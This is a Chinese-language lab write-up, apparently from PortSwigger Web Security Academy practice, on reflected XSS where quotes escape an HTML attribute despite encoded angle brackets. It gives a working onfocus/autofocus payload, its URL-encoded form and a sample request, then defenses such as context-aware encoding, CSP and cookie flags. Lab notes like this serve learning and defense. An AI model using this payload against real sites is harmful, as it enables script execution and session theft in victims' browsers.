---
tags:
  - Web安全
  - XSS
  - 跨站脚本
  - 属性上下文
  - PortSwigger
category: XSS
severity: 中危
type: 反射型XSS
created: 2026-08-31
---

# 用 HTML 编码的角括号将 XSS 反射到属性中

## 1. 威胁 / 漏洞概述

该类反射型 XSS 出现在用户输入被反射到 HTML 属性值中的场景。服务端对 `<` 和 `>` 进行了 HTML 编码，导致传统的标签注入方式无法直接生效；但如果双引号没有被正确编码，攻击者仍可以闭合原有属性，并注入事件处理属性。

典型反射点：

```html
<input type="text" name="search" value="用户输入">
```

如果输入内容可控，且引号过滤不完整，就可能从 `value` 属性逃逸到其他 HTML 属性中。

> 本笔记基于 Web Security Academy 靶场练习，仅适用于授权靶场和测试环境。

## 2. 技术分析

### 2.1 输入处理结果

原始输入：

```html
<script>alert(1)</script>
```

服务端编码后可能变为：

```html
&lt;script&gt;alert(1)&lt;/script&gt;
```

浏览器会将其解析为普通文本，而不是可执行的 `<script>` 元素。

### 2.2 关键缺陷

过滤只处理了角括号：

```text
<  →  &lt;
>  →  &gt;
```

但没有正确处理双引号：

```text
"  →  未编码
```

因此攻击者可以使用双引号结束原有的 `value` 属性。

### 2.3 攻击链

```text
输入位于 HTML 属性上下文
        ↓
角括号被编码，不能直接插入 script/img 等标签
        ↓
双引号未编码，可以闭合 value 属性
        ↓
注入事件处理属性
        ↓
autofocus 使输入框自动获得焦点
        ↓
触发 onfocus 中的 JavaScript
```

## 3. 验证步骤 / PoC

### 3.1 确认反射位置

先输入无害标记：

```text
test123
```

在响应源码中搜索 `test123`。如果看到类似内容：

```html
<input name="search" value="test123">
```

说明输入位于 HTML 属性上下文。

### 3.2 测试角括号编码

提交：

```html
<test123>
```

如果响应变为：

```html
&lt;test123&gt;
```

说明角括号被 HTML 编码。

### 3.3 测试引号是否可逃逸

在授权靶场中使用以下 PoC：

```text
" autofocus onfocus=alert(1) x="
```

经 URL 编码后可表示为：

```text
%22%20autofocus%20onfocus%3Dalert%281%29%20x%3D%22
```

预期解析结果：

```html
<input
  type="text"
  name="search"
  value=""
  autofocus
  onfocus="alert(1)"
  x=""
>
```

`autofocus` 使输入框自动获得焦点，随后触发 `onfocus`，弹出 `alert(1)` 即表示靶场验证成功。

### 3.4 Burp Repeater 验证思路

1. 正常搜索任意关键词并抓取请求。
2. 将请求发送到 Repeater。
3. 只修改搜索参数，保持其他请求不变。
4. 查看响应正文中输入内容的上下文。
5. 对比角括号、单引号、双引号是否被编码。
6. 仅在授权靶场中使用最小化 PoC 验证执行效果。

示例请求结构：

```http
GET /?search=%22%20autofocus%20onfocus%3Dalert%281%29%20x%3D%22 HTTP/1.1
Host: lab.example
Connection: close
```

## 4. 影响评估

如果该问题存在于真实业务系统，攻击者可能通过构造恶意链接，使受害者访问包含恶意搜索参数的页面，从而在受害者浏览器上下文中执行 JavaScript。潜在影响包括：

- 读取页面中当前用户可访问的数据；
- 修改页面内容或执行受害者权限范围内的操作；
- 窃取非 HttpOnly 的会话信息；
- 冒充受害者提交业务请求；
- 结合其他业务缺陷扩大影响。

实际风险取决于 CSP、Cookie 属性、用户权限以及反射点所在页面的业务功能。

## 5. 防御建议 / 修复方案

### 5.1 按上下文进行输出编码

将用户输入放入 HTML 属性时，至少正确编码：

```text
&  →  &amp;
<  →  &lt;
>  →  &gt;
"  →  &quot;
'  →  &#x27;
```

不要只过滤 `<` 和 `>`，因为攻击者可能通过引号闭合属性。

### 5.2 使用安全模板引擎

优先使用默认开启上下文感知转义的模板引擎，并避免通过字符串拼接生成 HTML：

```javascript
// 不推荐
input.innerHTML = '<input value="' + search + '">';

// 推荐
input.value = search;
```

### 5.3 配置 CSP

部署内容安全策略，降低 XSS 成功后的影响：

```http
Content-Security-Policy: default-src 'self'; script-src 'self'
```

生产环境应逐步移除不必要的 inline script 和 inline event handler。

### 5.4 Cookie 安全属性

会话 Cookie 应配置：

```http
Set-Cookie: session=...; Secure; HttpOnly; SameSite=Lax
```

### 5.5 修复验证

修复后重新提交：

```text
" autofocus onfocus=alert(1) x="
```

确认响应中双引号被编码为 `&quot;`，且输入无法生成新的 HTML 属性或事件处理器。

## 6. 一句话总结

这是一个“HTML 属性上下文 + 角括号被编码 + 双引号未编码”的反射型 XSS；利用重点不是绕过 `< >`，而是先用双引号闭合 `value` 属性，再注入事件属性并触发执行。

## 7. 相关概念

- HTML 上下文与属性上下文
- 输出编码与输入过滤的区别
- 反射型 XSS
- 事件处理器注入
- `autofocus` 与 `onfocus`
- Burp Repeater
- 上下文感知编码
